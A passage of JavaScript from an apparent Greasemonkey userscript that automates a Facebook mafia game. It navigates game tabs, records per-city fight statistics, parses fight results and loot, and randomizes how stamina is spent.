  var elt = xpathFirst('//div[@id="nav_link_fight_unlock"]//a');
  if (!elt) {
    // Find the visible fight link
    var elts = $x('//div[@class="nav_link fight_link"]//a');
    for (var i = 0, numElts=elts.length; i < numElts; ++i) {
      if (elts[i].scrollWidth) {
        elt = elts[i];
        break;
      }
    }

    if (!elt) {
      addToLog('warning Icon', 'Can\'t find fight nav link to click.');
      return;
    }
  }
  clickElement(elt);
  DEBUG('Clicked to go to fights.');
}

function goFightTab() {
  var elt = xpathFirst('.//div[@class="tab_content"]//a[contains(., "Fight")]', innerPageElt);
  if (!elt) {
    goFightNav();
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to fight tab.');
}

function goRivalsTab() {
  var elt = xpathFirst('.//div[@class="minitab_content"]//a[contains(., "Rivals")]', innerPageElt);
  if (!elt) {
    goFightNav();
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to rivals tab.');
}

function goTournamentTab() {
  var elt = makeElement('a', null, {'onclick':'return do_ajax("inner_page","remote/html_server.php?xw_controller=tournament&xw_action=view&xw_city=5", 1, 1, 0, 0); return false;'});
  if (elt) {
    clickElement(elt);
    DEBUG('Clicked to go to tournament tab.');
  }
}

function goHitlistTab() {
  var elt = xpathFirst('.//div[@class="tab_content"]//a[contains(., "Hitlist")]', innerPageElt);
  if (!elt) {
    goFightNav();
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to hitlist.');
}

function goPropertyNav() {
  if(new_header){
    var elt = xpathFirst('//a[@class="header_properties_button"]')
  } else {
    var elt = xpathFirst('.//span[@id="nav_link_properties"]//a', menubarElt);
  }

  if (!elt) {
    addToLog('warning Icon', 'Can\'t find properties nav link to click.');
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to properties.');
}

function goDeleteNews() {
  var elt = xpathFirst('.//a[contains(@onclick,"xw_action=deletenews") and contains(text(),"Clear")]', innerPageElt);
  if (!elt) {
    DEBUG('Can\'t find Clear Updates link to click. ');
    return;
  }
  clickElement(elt);
  GM_setValue('logPlayerUpdatesCount', 0);
  DEBUG('Clicked to delete news.');
}

function goNY() {
  goLocation(NY);
}

function goCuba() {
  goLocation(CUBA);
}

function goMoscow() {
  goLocation(MOSCOW);
}

function goLocation(toCity) {
  // Already in this city
  if (toCity == city) {
    DEBUG('Already in ' + cities[toCity][CITY_NAME] + '.');
    return true;
  }

  // Check if level allows traveling to certain cities
  if (level < cities[toCity][CITY_LEVEL]) {
    addToLog('warning Icon', 'WARNING: Current level does not allow travel to ' + cities[toCity][CITY_NAME] + '. ');
    DEBUG('Staying in ' + cities[city][CITY_NAME]);
    return false;
  }

  // Find and click the travel element for the given destination.
  var elt = xpathFirst('//div[@id="travel_menu"]//a[contains(., "' + cities[toCity][CITY_NAME] + '")]');

  if (elt) {
    clickElement(elt);
    DEBUG('Clicked to travel to ' + cities[toCity][CITY_NAME] + '.');
    return true;
  }

  addToLog('warning Icon', 'Unable to find ' + cities[toCity][CITY_NAME] +
           ' travel link. ');
  return false;
}

function prepStatsArray(workingArray, currentHour){
  for (var i = 0; i < workingArray.length; i++){
    if (isNaN(workingArray[i])) {
      workingArray[i] = 0;
    }
  }
  currentHour = currentHour * 1;
  var outputVals = [];
  for (i = 0; i < 24; i++){
    var ind;
    ind = currentHour - i;
    if (ind < 0) {ind = 24 + ind}
      outputVals.unshift(workingArray[ind]);
  }
  return outputVals;
}

//statSpecs Array
//Return Format: [0]Min, [1]Max. [2]Avg [3]Sum [4]Valid Count
function getStatSpecs(workingArray, includeZeroVals){
  var tempArray = [];
  var runningSum = 0;
  var dataLen, dataMin, dataMax;
  for (var i = 0; i < workingArray.length; i++) {
    if (workingArray[i] != 0 && includeZeroVals == 0) {
      tempArray.push(workingArray[i]);
      runningSum += workingArray[i];
    }else {
      runningSum += workingArray[i];
    }
  }
  if (includeZeroVals == 0) {
    tempArray.sort( function (a, b) { return a-b});
    dataLen = tempArray.length;
    dataMin = tempArray[0];
    dataMax = tempArray[dataLen - 1];
  } else {
    workingArray.sort( function (a, b) { return a-b});
    dataLen = workingArray.length;
    dataMin = workingArray[0];
    dataMax = workingArray[dataLen - 1];
  }
  var dataAvg = runningSum/dataLen;
  dataAvg = Math.round(dataAvg*Math.pow(10, 2))/Math.pow(10, 2);
//  alert("Sum: " + runningSum + "    len: " + dataLen + "   avg: " + dataAvg);
  return[dataMin, dataMax, dataAvg, runningSum, dataLen];
}


function takeFightStatistics(experience, winCount, lossCount, cashStr, resultType) {
  var loc = city;
  var xp = parseInt(experience);
  var cashInt = parseCash(cashStr);
  var cashLoc = parseCashLoc(cashStr);

  //addToLog('warning Icon', loc+' '+cashLoc +') Attack Stat Results : '+winCount+' / '+lossCount+' / '+cashStr);
  DEBUG('Attack Stat Results : '+winCount+' / '+lossCount+' / '+cashStr);

  if (winCount > 0) {
    // WON the fight.
    GM_setValue('totalExpInt', GM_getValue('totalExpInt', 0) + xp);
    GM_setValue('fightWinCountInt', GM_getValue('fightWinCountInt', 0) + winCount);
    GM_setValue('totalWinDollarsInt', String(parseInt(GM_getValue('totalWinDollarsInt', 0)) + cashInt));

    switch (loc) {
      case NY:
        // Fight Win NY Stats
        GM_setValue('fightWinsNY', GM_getValue('fightWinsNY', 0) + winCount);
        GM_setValue('fightExpNY', GM_getValue('fightExpNY', 0) + xp);
        break;
      case CUBA:
        // Fight Win Cuba Stats
        GM_setValue('fightWinsCuba', GM_getValue('fightWinsCuba', 0) + winCount);
        GM_setValue('fightExpCuba', GM_getValue('fightExpCuba', 0) + xp);
        break;
      case MOSCOW:
        // Fight Win Moscow Stats
        GM_setValue('fightWinsMoscow', GM_getValue('fightWinsMoscow', 0) + winCount);
        GM_setValue('fightExpMoscow', GM_getValue('fightExpMoscow', 0) + xp);
        break;
      case BANGKOK:
        // Fight Win Bangkok Stats
        GM_setValue('fightWinsBangkok', GM_getValue('fightWinsBangkok', 0) + winCount);
        GM_setValue('fightExpBangkok', GM_getValue('fightExpBangkok', 0) + xp);
        break;
      case LV:
        // Fight Win Las Vegas Stats
        GM_setValue('fightWinsVegas', GM_getValue('fightWinsVegas', 0) + winCount);
        GM_setValue('fightExpVegas', GM_getValue('fightExpVegas', 0) + xp);
        break;
        case ITALY:
        // Fight Win Italy Stats
        GM_setValue('fightWinsItaly', GM_getValue('fightWinsItaly', 0) + winCount);
        GM_setValue('fightExpItaly', GM_getValue('fightExpItaly', 0) + xp);
        break;
    }
    switch (cashLoc) {
      case NY: GM_setValue('fightWin$NY', String(parseInt(GM_getValue('fightWin$NY', 0)) + cashInt)); break;
      case CUBA: GM_setValue('fightWin$Cuba', String(parseInt(GM_getValue('fightWin$Cuba', 0)) + cashInt)); break;
      case MOSCOW: GM_setValue('fightWin$Moscow', String(parseInt(GM_getValue('fightWin$Moscow', 0)) + cashInt)); break;
      case BANGKOK: GM_setValue('fightWin$Bangkok', String(parseInt(GM_getValue('fightWin$Bangkok', 0)) + cashInt)); break;
      case LV: GM_setValue('fightWin$Vegas', String(parseInt(GM_getValue('fightWin$Vegas', 0)) + cashInt)); break;
      case ITALY: GM_setValue('fightWin$Italy', String(parseInt(GM_getValue('fightWin$Italy', 0)) + cashInt)); break;
    }
  }

  // we lost at least 1 fight
  if (lossCount > 0) {
    GM_setValue('fightLossCountInt', GM_getValue('fightLossCountInt', 0) + lossCount);
    //GM_setValue('totalLossDollarsInt', String(parseInt(GM_getValue('totalLossDollarsInt', 0)) + cashInt));

    switch (loc) {
      case NY:
        //Fight Loss NY Stats
        GM_setValue('fightLossesNY', (GM_getValue('fightLossesNY', 0) + lossCount));
        if (resultType == 2) {
          GM_setValue('fightLossBGCHNY', GM_getValue('fightLossBGCHNY', 0) + lossCount);
        } else if (resultType == 1) {
          GM_setValue('fightLossCHNY', GM_getValue('fightLossCHNY', 0) + lossCount);
        } else {
          GM_setValue('fightLossStrongNY', GM_getValue('fightLossStrongNY', 0) + lossCount);
        }
        break;
      case CUBA:
        //Fight Loss Cuba Stats
        GM_setValue('fightLossesCuba', GM_getValue('fightLossesCuba', 0) + lossCount);
        if (resultType == 2) {
          GM_setValue('fightLossBGCHCuba', GM_getValue('fightLossBGCHCuba', 0) + lossCount);
        } else if (resultType == 1) {
          GM_setValue('fightLossCHCuba', GM_getValue('fightLossCHCuba', 0) + lossCount);
        } else {
          GM_setValue('fightLossStrongCuba', GM_getValue('fightLossStrongCuba', 0) + lossCount);
        }
        break;
      case MOSCOW:
        //Fight Loss MOSCOW Stats
        GM_setValue('fightLossesMoscow', (GM_getValue('fightLossesMoscow', 0) + lossCount));
        if (resultType == 2) {
          GM_setValue('fightLossBGCHMoscow', GM_getValue('fightLossBGCHMoscow', 0) + lossCount);
        } else if (resultType == 1) {
          GM_setValue('fightLossCHMoscow', GM_getValue('fightLossCHMoscow', 0) + lossCount);
        } else {
          GM_setValue('fightLossStrongMoscow', GM_getValue('fightLossStrongMoscow', 0) + lossCount);
        }
        break;
      case BANGKOK:
        //Fight Loss BANGKOK Stats
        GM_setValue('fightLossesBangkok', (GM_getValue('fightLossesBangkok', 0) + lossCount));
        if (resultType == 2) {
          GM_setValue('fightLossBGCHBangkok', GM_getValue('fightLossBGCHBangkok', 0) + lossCount);
        } else if (resultType == 1) {
          GM_setValue('fightLossCHBangkok', GM_getValue('fightLossCHBangkok', 0) + lossCount);
        } else {
          GM_setValue('fightLossStrongBangkok', GM_getValue('fightLossStrongBangkok', 0) + lossCount);
        }
        break;
      case LV:
        //Fight Loss VEGAS Stats
        GM_setValue('fightLossesVegas', (GM_getValue('fightLossesVegas', 0) + lossCount));
        if (resultType == 2) {
          GM_setValue('fightLossBGCHVegas', GM_getValue('fightLossBGCHVegas', 0) + lossCount);
        } else if (resultType == 1) {
          GM_setValue('fightLossCHVegas', GM_getValue('fightLossCHVegas', 0) + lossCount);
        } else {
          GM_setValue('fightLossStrongVegas', GM_getValue('fightLossStrongVegas', 0) + lossCount);
        }
        break;
       case ITALY:
        //Fight Loss ITALY Stats
        GM_setValue('fightLossesItaly', (GM_getValue('fightLossesItaly', 0) + lossCount));
        if (resultType == 2) {
          GM_setValue('fightLossBGCHItaly', GM_getValue('fightLossBGCHItaly', 0) + lossCount);
        } else if (resultType == 1) {
          GM_setValue('fightLossCHItaly', GM_getValue('fightLossCHItaly', 0) + lossCount);
        } else {
          GM_setValue('fightLossStrongItaly', GM_getValue('fightLossStrongItaly', 0) + lossCount);
        }
        break;
      default:
        break;
    }
  }

  // we lost all fights, money is 'Loss $'
  if (winCount == 0) {
    GM_setValue('totalLossDollarsInt', String(parseInt(GM_getValue('totalLossDollarsInt', 0)) + cashInt));

    switch (loc) {
      case NY:
        //Fight Loss NY Stats
        if (resultType == 2) {
          GM_setValue('fightLossBGCH$NY', String(parseInt(GM_getValue('fightLossBGCH$NY', 0)) + cashInt));
        } else if (resultType == 1) {
          GM_setValue('fightLossCH$NY', String(parseInt(GM_getValue('fightLossCH$NY', 0)) + cashInt));
        } else {
          GM_setValue('fightLossStrong$NY', String(parseInt(GM_getValue('fightLossStrong$NY', 0)) + cashInt));
        }
        break;
      case CUBA:
        //Fight Loss Cuba Stats
        if (resultType == 2) {
          GM_setValue('fightLossBGCH$Cuba', String(parseInt(GM_getValue('fightLossBGCH$Cuba', 0)) + cashInt));
        } else if (resultType == 1) {
          GM_setValue('fightLossCH$Cuba', String(parseInt(GM_getValue('fightLossCH$Cuba', 0)) + cashInt));
        } else {
          GM_setValue('fightLossStrong$Cuba', String(parseInt(GM_getValue('fightLossStrong$Cuba', 0)) + cashInt));
        }
        break;
      case MOSCOW:
        //Fight Loss MOSCOW Stats
        if (resultType == 2) {
          GM_setValue('fightLossBGCH$Moscow', String(parseInt(GM_getValue('fightLossBGCH$Moscow', 0)) + cashInt));
        } else if (resultType == 1) {
          GM_setValue('fightLossCH$Moscow', String(parseInt(GM_getValue('fightLossCH$Moscow', 0)) + cashInt));
        } else {
          GM_setValue('fightLossStrong$Moscow', String(parseInt(GM_getValue('fightLossStrong$Moscow', 0)) + cashInt));
        }
        break;
      case BANGKOK:
        //Fight Loss BANGKOK Stats
        if (resultType == 2) {
          GM_setValue('fightLossBGCH$Bangkok', String(parseInt(GM_getValue('fightLossBGCH$Bangkok', 0)) + cashInt));
        } else if (resultType == 1) {
          GM_setValue('fightLossCH$Bangkok', String(parseInt(GM_getValue('fightLossCH$Bangkok', 0)) + cashInt));
        } else {
          GM_setValue('fightLossStrong$Bangkok', String(parseInt(GM_getValue('fightLossStrong$Bangkok', 0)) + cashInt));
        }
        break;
      case LV:
        //Fight Loss VEGAS Stats
        if (resultType == 2) {
          GM_setValue('fightLossBGCH$Vegas', String(parseInt(GM_getValue('fightLossBGCH$Vegas', 0)) + cashInt));
        } else if (resultType == 1) {
          GM_setValue('fightLossCH$Vegas', String(parseInt(GM_getValue('fightLossCH$Vegas', 0)) + cashInt));
        } else {
          GM_setValue('fightLossStrong$Vegas', String(parseInt(GM_getValue('fightLossStrong$Vegas', 0)) + cashInt));
        }
        break;
      case ITALY:
        //Fight Loss ITALY Stats
        if (resultType == 2) {
          GM_setValue('fightLossBGCH$Italy', String(parseInt(GM_getValue('fightLossBGCH$Italy', 0)) + cashInt));
        } else if (resultType == 1) {
          GM_setValue('fightLossCH$Italy', String(parseInt(GM_getValue('fightLossCH$Italy', 0)) + cashInt));
        } else {
          GM_setValue('fightLossStrong$Italy', String(parseInt(GM_getValue('fightLossStrong$Italy', 0)) + cashInt));
        }
        break;
      default:
        break;
    }
    switch (cashLoc) {
      case NY: GM_setValue('fightLoss$NY', String(parseInt(GM_getValue('fightLoss$NY', 0)) + cashInt)); break;
      case CUBA: GM_setValue('fightLoss$Cuba', String(parseInt(GM_getValue('fightLoss$Cuba', 0)) + cashInt)); break;
      case MOSCOW: GM_setValue('fightLoss$Moscow', String(parseInt(GM_getValue('fightLoss$Moscow', 0)) + cashInt)); break;
      case BANGKOK: GM_setValue('fightLoss$Bangkok', String(parseInt(GM_getValue('fightLoss$Bangkok', 0)) + cashInt)); break;
      case LV: GM_setValue('fightLoss$Vegas', String(parseInt(GM_getValue('fightLoss$Vegas', 0)) + cashInt)); break;
      case ITALY: GM_setValue('fightLoss$Italy', String(parseInt(GM_getValue('fightLoss$Italy', 0)) + cashInt)); break;
    }
  }
}

function logFightResponse(rootElt, resultElt, context) {
  var how = getStaminaMode();
  lastOpponent = context;
  var inner = resultElt? resultElt.innerHTML : '';
  var innerNoTags = inner.untag();
  var messages = $x('.//td[@class="message_body"]', resultElt);
  var elt = messages[0]? messages[0].firstChild : undefined;
  var cost;

  if (resultElt.className == "fight_results") {
    // A fight took place. Results are in the "VS" format.
    var attackAgainElt;
    DEBUG(' Current Health at :'+health +' (Fight Response) - Health Min : '+GM_getValue('stopPAHealth'));
    if (isGMChecked('staminaPowerattack') && ((isGMChecked('stopPA') && health >= GM_getValue('stopPAHealth')) || !isGMChecked('stopPA')))
      attackAgainElt = xpathFirst('.//a[contains(.,"Power Attack")]', resultElt);
    if (!attackAgainElt) attackAgainElt = xpathFirst('.//a[contains(.,"Attack Again")]', resultElt);
    lastOpponent.attackAgain = undefined;

    // Click the 'multiple' secret stash immediately on specified interval base
    var eltStash;
    var eltStashID;
    var eltStashParent;
    for(i=0;i<5;i++) {
      eltStashID = 'fight_loot_feed_btn_'+i;
      eltStash = document.getElementById(eltStashID, resultElt);
      if (eltStash && isGMChecked('autoSecretStash')){
        eltStashParent = eltStash.parentNode.parentNode // Should be a fightres_bonus_message element.
        var SecretStashFightingCount = parseInt(GM_getValue('SecretStashFightingCount')) ? parseInt(GM_getValue('SecretStashFightingCount')) : 0;
        var publishFrequency =  parseInt(GM_getValue('autoSecretStashFrequency')) ? parseInt(GM_getValue('autoSecretStashFrequency')) : 1;
        var logFrequency = parseInt(SecretStashFightingCount % publishFrequency);
        if(SecretStashFightingCount % publishFrequency == 0) {
          clickElement(eltStash);
          var stashFinder = xpathFirst('.//div[contains(.,"found the location")]/a', eltStashParent);
          var stashUser = linkToString(stashFinder, 'stashUser');
          addToLog('lootbag Icon','Clicked to send a secret stash to '+stashUser+'!');
        } else {
          DEBUG('Skipped secret stash publishing ('+logFrequency+'/'+publishFrequency+')');
        }
        SecretStashFightingCount+=1;
        GM_setValue('SecretStashFightingCount',SecretStashFightingCount);
      }
    }

    //Click Share Coins
    var coinLink, coinElt;
    coinElt = document.getElementById('share_asn_feed', resultElt);
    if (coinElt && isGMChecked('autoShareCoins')) {
      coinLink = xpathFirst('.//a[@class="sexy_button_new short white"]//span[contains(.,"Share Coins")]', coinElt);
      if (coinLink){
        if (innerNoTags.match(/(.+?) earned you (.+?) victory coins/i)) shareTo = RegExp.$1;
        clickElement(coinLink);
        addToLog('info Icon', 'Clicked to Share Coins with '+shareTo);
      }
    }

    if (how == STAMINA_HOW_FIGHT_RANDOM || how == STAMINA_HOW_FIGHT_RIVALS){
      findFightOpponent(rootElt);
	    //findRivalOpponent(rootElt);
	  }
	  else if (how == STAMINA_HOW_FIGHT_LIST) {
      cycleSavedList('pfightlist');
    }

    // Determine whether the opponent is alive and may see future attacks.
    if (inner.indexOf('Attack Again') != -1) {
      setFightOpponentActive(context);
    } else {
      setFightOpponentInactive(context);
    }

    // Get the opponent, experience & cash.
    if (!innerNoTags.match(/(\d+)\s*experience/i)) {
      addToLog('warning Icon', 'BUG DETECTED: Unable to read "vs" win/loss.');
      addToLog('warning Icon', 'Result content: ' + inner);
      return false;
    }

    var experience = parseInt(RegExp.$1);
    cost = innerNoTags.match(REGEX_CASH)? RegExp.lastMatch : undefined;

    // Get the opponent's details.
    var opponentElt = xpathFirst('.//div[@class="fightres_opponent"]', resultElt);
    var user, userSize, userBoost;
    if (opponentElt) {
      elt = xpathFirst('.//div[@class="fightres_name"]/a', opponentElt);
      user = linkToString(elt, 'user');
      elt = xpathFirst('.//div[contains(@class, "fightres_group_size")]', opponentElt);
      if (elt) {
        userSize = elt.innerHTML.untag().trim();
      }
      elt = xpathFirst('.//div[@class="fightres_top3_boost"]//img',opponentElt);
      if (elt) {
        userBoost = elt.title;
      }
    }

    var powerAttack = xpathFirst('.//div[@class="fightres_hint"]', resultElt);

    // non-power attack results
    var winCount = experience > 0 ? 1 : 0;
    var lossCount = experience == 0 ? 1 : 0;

    // do we have power attack results?
    var fightHintElt = xpathFirst('.//div[@class="fightres_hint"]')
    if (fightHintElt && innerNoTags.match('Power Attack')) {
      if (innerNoTags.match(/Win:\s*(\d+)/i))
        winCount = parseInt(RegExp.$1);
      if (innerNoTags.match(/Loss:\s*(\d+)/i))
        lossCount = parseInt(RegExp.$1);
    }

    var powerAttackResult="";
    if (powerAttack) powerAttackResult = powerAttack.innerHTML.untag().trim();

    // Did we win or lose?
    var resultType;
    var result = 'Fought ' + user + '\'s mafia of ' + userSize;
    if (experience) {
      result += ' and <span class="good">' + 'WON</span>, gaining <span class="good">' + experience + ' experience</span> and ' +
                '<span class="good">' + cost + '</span>. '+powerAttackResult;
      addToLog('yeah Icon', result);
    } else {
      result += ' and <span class="bad">' +
                'LOST</span>, losing <span class="bad">' + cost + '</span>.';
      resultType = 0;
      // Show any boost the opponent used.
      if (userBoost && userBoost.match(/[^(]+/)) {
        result += ' <span class="warn">('+RegExp.lastMatch.trim()+')</span>';
      }

      // Don't fight this opponent again.
      result += ' Too strong!';
      if (how == STAMINA_HOW_FIGHT_RANDOM ||
          isGMChecked('fightRemoveStronger')) {
        result += ' Avoiding.';
        setFightOpponentAvoid(context);
      }
      // }
      addToLog('omg Icon', result);
    }

    // Check for any fatalities.
    if (innerNoTags.match(/body\s+count\s+to\s+(\d+)/i)) {
      addToLog('killedMobster Icon', ' You <span class="bad">' + 'KILLED' + '</span> ' + user + '. Your body count has increased to <span class="bad">' + RegExp.$1 + '</span>.');
      //addToLog('info Icon', ' You <span class="bad">' + 'KILLED' + '</span> ' + user + '. Your body count has increased to <span class="bad">' + RegExp.$1 + '</span>.');
    }
    if (innerNoTags.indexOf('You were snuffed') != -1) {
      addToLog('omg Icon', 'You <span class="bad">' + 'DIED' + '</span> in the fight.');
    }

    // Look for any loot.
    var lootRE = /(received|earned|gained|found) (some|an?|\d) (.+?)[\.!]/gi;
    var match;
    var foundLoot;
    var totalAttack;
    var totalDefense;
    var txtLog="";

    while(match = lootRE.exec(innerNoTags)){
      foundLoot = match[2] + ' ' + match[3];
      totalAttack = !isUndefined(prevAttackEquip) ? curAttackEquip - prevAttackEquip: 0;
      totalDefense = !isUndefined(prevDefenseEquip) ? curDefenseEquip - prevDefenseEquip: 0;
      if(txtLog) txtLog += '<br/>'+' Found <span class="loot">'+ foundLoot + '</span> in the fight.';
      else txtLog = ' Found <span class="loot">'+ foundLoot + '</span> in the fight.';
    }
    if(totalAttack>0) txtLog += '<br/>Loot Stat: Attack Strength: Old=' + prevAttackEquip + ', New=<span class="loot">' + curAttackEquip+'</span>';
    if(totalDefense>0) txtLog += '<br/>Loot Stat: Defense Strength: Old=' + prevDefenseEquip + ', New=<span class="loot">' + curDefenseEquip+'</span>';
    if(txtLog) addToLog('lootbag Icon', txtLog);

    //Look for Victory Coins
    if (innerNoTags.match(/(.+?) victory coins/i)) {
      gainCoins = RegExp.$1;
      if (innerNoTags.match(/earned you (.+?) victory coins/i)) gainCoins = RegExp.$1;
      totalCoins = xpathFirst('.//div[@class="fightmastery_tokens"]', rootElt);
      innerCoins = totalCoins? totalCoins.innerHTML : '';
      innerCoinsTotal = innerCoins.split(" ")[0];
      addToLog('info Icon', 'Gained <span class="good">' +gainCoins+ ' Victory Coin(s)</span>, bringing your total to : <span class="good">'+innerCoinsTotal+'</span>');
    }

    // Check Fightlevel / Fight Mastery
    fightMeterTxt = xpathFirst('.//div[@class="fightmastery_meter_text"]', rootElt);
    innerMeterTxt = fightMeterTxt? fightMeterTxt.innerHTML : '';
    fightMeterPct = xpathFirst('.//div[@class="fightmastery_meter_text_percent"]', rootElt);
    innerMeterPct = fightMeterPct? fightMeterPct.innerHTML : '';

    if(innerMeterTxt && innerMeterPct) {
      oldfightMeterTxt = GM_getValue('fightLevel',0)
      oldfightMeterPct = GM_getValue('fightLevelPct',0)
      AttackCounts = GM_getValue('fightLevelAttacks',0)+winCount+lossCount;
      GM_setValue('fightLevelAttacks',  AttackCounts);
      if( (innerMeterTxt != oldfightMeterTxt) || (innerMeterPct != oldfightMeterPct) ) {
        totalCount = winCount+lossCount;
        GM_setValue('fightLevel', innerMeterTxt);
        GM_setValue('fightLevelPct', innerMeterPct);
        GM_setValue('fightLevelAttacks', totalCount);
        addToLog('info Icon', 'Fight Mastery '+ innerMeterTxt + ' ('+innerMeterPct + ') completed after '+AttackCounts+ ' attacks.');
      }
    }

    // Update the statistics.
    takeFightStatistics(experience, winCount, lossCount, cost, resultType);
    updateLogStats();

    // Click Attack Again immediately to milk our cash-cow
    if (experience && canSpendStamina() && ptsToNextLevel > 6) {
      var attackAgain = isGMChecked ('staminaReattack') &&
                        (
                          (GM_getValue('reattackThreshold') == 0) ||
                          (parseCash(cost) >= GM_getValue('reattackThreshold') &&
                           cost.indexOf(cities[city][CITY_CASH_SYMBOL]) != -1)
                         );
      if (attackAgain && attackAgainElt) {
        lastOpponent.attackAgain = attackAgainElt;
        // Attack again immediately.
        Autoplay.fx = function() {
          clickAction = 'fight';
          clickContext = context;
          speedClick (attackAgainElt);
          DEBUG('Clicked to repeat the attack on ' + context.name +
                ' (' + context.id + ').');
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return true;
      }
    }

  } else if (innerNoTags.match(/you cannot fight|part of your mafia/i)) {
    if (context.id) {
      DEBUG('Opponent (' + context.id + ') is part of your mafia. Avoiding.');
      setFightOpponentAvoid(context);
    }

  } else if (innerNoTags.match(/You just set/)) {
      cycleSavedList('pautoHitOpponentList');
      addToLog('yeah Icon', inner);
      if(isGMChecked('bgAutoHitCheck')) setGMTime("bgAutoHitTime", "01:00");
      var fbPopupElt = xpathFirst('//a[@id="fb_dialog_cancel_button"]');
      if (fbPopupElt) {
        Autoplay.fx = function() {
          clickElement(fbPopupElt);
          DEBUG('Clicked Dismissed Popup!');
        };
      Autoplay.start();
      return true;
      }
  } else if (innerNoTags.match(/There is already a bounty/) || innerNoTags.match(/You can\'t add/)) {
      cycleSavedList('pautoHitOpponentList');
      if(isGMChecked('bgAutoHitCheck')) setGMTime("bgAutoHitTime", "01:00");
  } else if (innerNoTags.indexOf('too weak') != -1) {
    addToLog('info Icon', '<span style="color:#FF9999;">' + 'Too weak to fight.'+ '</span>');
  } else {
    DEBUG('Unrecognized fight response:' + inner);
  }

  randomizeStamina();
  return false;
}

// Spend Stamina successful, change fight location and spend mode
function randomizeStamina() {
  if (isGMEqual('staminaSpendHow', STAMINA_HOW_RANDOM)) {

    var randomModes = GM_getValue('randomSpendModes');
    // Do not include autohit list STAMINA_HOW_FIGHT_RIVALS
    //var spendMode = Math.floor(Math.random() * STAMINA_HOW_AUTOHITLIST);
    var spendMode = Math.floor(Math.random() * STAMINA_HOW_FIGHT_RIVALS);
    while(randomModes[spendMode]!='1'){
      spendMode = Math.floor(Math.random() * STAMINA_HOW_FIGHT_RIVALS);
    }

    DEBUG('Stamina Spend Mode Randomize set to : '+ spendMode + ' was ' +newStaminaMode);
    newStaminaMode = spendMode;

/*
    // Randomize stamina spend mode
    if (randomModes[spendMode]=='1') {
      newStaminaMode = spendMode;
      DEBUG('Stamina Spend Mode : ' + staminaSpendChoices[spendMode]);
    } else {
      DEBUG('Stamina Spend Mode did not qualify');
    }
*/
    var randomCities = GM_getValue('randomFightLocations');

    // Randomize fight location
    while (spendMode == STAMINA_HOW_FIGHT_RANDOM || spendMode == STAMINA_HOW_FIGHT_LIST) {
      var stamLoc = Math.floor(Math.random()*(cities.length));
      DEBUG('Fight City Randomize set to : '+ stamLoc + ' was ' +GM_getValue('fightLocation'));
      if (randomCities[stamLoc]=='1') {
        GM_setValue('fightLocation', stamLoc);
        DEBUG('Fight location set to : ' + cities[stamLoc][CITY_NAME]);
        break;
      } else {
        DEBUG('Fight location did not qualify');
      }
    }

    // Randomize robbing location
    randomCities = GM_getValue('randomRobLocations');
    while (spendMode == STAMINA_HOW_ROBBING) {
      var stamLoc = Math.floor(Math.random()*(cities.length));
      DEBUG('Rob City Randomize set to : '+ stamLoc + ' was ' +GM_getValue('robLocation'));
      if (randomCities[stamLoc]=='1') {
        GM_setValue('robLocation', stamLoc);
        DEBUG('Robbing location set to : ' + cities[stamLoc][CITY_NAME]);
        break;
      }
      else {
        DEBUG('Rob location did not qualify');
      }
    }

    // Randomize hitman location
    randomCities = GM_getValue('randomHitmanLocations');
    while (spendMode == STAMINA_HOW_HITMAN) {
      var stamLoc = Math.floor(Math.random()*(cities.length));
      DEBUG('Hitman City Randomize set to : '+ stamLoc + ' was ' +GM_getValue('hitmanLocation'));
      if (randomCities[stamLoc]=='1') {
        GM_setValue('hitmanLocation', stamLoc);
        DEBUG('Hitman location set to : ' + cities[stamLoc][CITY_NAME]);
        break;
      } else {
        DEBUG('Hitman location did not qualify');
      }
    }
  }
}

/* Handle our private do_ajax response pages.
// case 1: autoplay==false for async clicks; please pass the variable(s) action (and optionally context)
// case 2: autoplay==true for sync clicks for use with Autoplay.start(); action and context are set with Autoplay.fx
// ajaxAction/ajaxContext are only used internally for async clicks, for sync clicks please use the default clickAction/clickContext vars.
*/
function createAjaxPage(autoplay, action, context) {
  //function do_ajax(div, url, liteLoad, alignTop, precall, callback, callback_params, noIncrement)
  var ajaxID = autoplay ? SCRIPT.ajaxIDSync : SCRIPT.ajaxIDAsync;
  var elt = document.getElementById(ajaxID);
  if (elt) {
    elt.removeEventListener('DOMSubtreeModified', handleAjaxModified, false);
    elt.parentNode.removeChild(elt);
  }
  elt = makeElement('div', null, {'id':ajaxID, 'style':'display: none;'});
  if (!autoplay) {
    ajaxAction = action;
    ajaxContext = context;
  }
  elt.addEventListener('DOMSubtreeModified', handleAjaxModified, false);
  document.getElementById('verytop').appendChild(elt);
  return ajaxID;
}

function handleAjaxModified(e) {
  var ajaxElt = e.target;
  // Remove event listener
  ajaxElt.removeEventListener('DOMSubtreeModified', handleAjaxModified, false);
  // Set result parsing timer
  //if (ajaxResultTimer) window.clearTimeout(ajaxResultTimer);
  window.setTimeout(function(){ajaxPageChanged(ajaxElt);}, 300);
}

function ajaxPageChanged(ajaxElt) {
  if (!ajaxElt) return;
  // Determine which of our private AJAX pages has changed and get the result.
  var ajaxSync = ajaxElt.id == SCRIPT.ajaxIDSync ? true : false;
  var ajaxResponse = ajaxElt.innerHTML;

  // Remove ajax response element
  ajaxElt.parentNode.removeChild(ajaxElt);

  DEBUG('New ' + (ajaxSync ? 'synchronous' : 'asynchronous') + ' ajax results.');
  // Handle changes to the ajax pages.
  // If a click or ajax action was taken, check the response.
  var action, context;
  if (ajaxSync) {
    action = clickAction;
    context = clickContext;
    clickAction = undefined;
    clickContext = undefined;
  } else {
    action = ajaxAction;
    context = ajaxContext;
    ajaxAction = undefined;
    ajaxContext = undefined;
  }
  if (!logJSONResponse(ajaxSync, ajaxResponse, action, context)) {
    // No further action was taken. Kick off auto-play.
    try {
      doAutoPlay();
    } catch (ex) {
      addToLog('warning Icon', 'BUG DETECTED (ajaxPageChanged->doAutoPlay): ' + ex + '. Reloading.');
      autoReload(true, 'error !logJSONResponse');
    }
  }
}

// Interpret the response from an ajax request, return false in case Autoplay isn't used:
function logJSONResponse(autoplay, response, action, context) {
  try {

    if(action == 'player updates'){	
	    response = response.replace(/<div id="header_div_tab_container">/,'<div id="BuildCollectModule" style="width: 450px; height: 42px"><div id="BuildCollectModule" class="clearfix empire_module_title"><div style="float: left;"><span>PLAYER UPDATES</span></div></div><div id="tab_container" style="display:none;">');
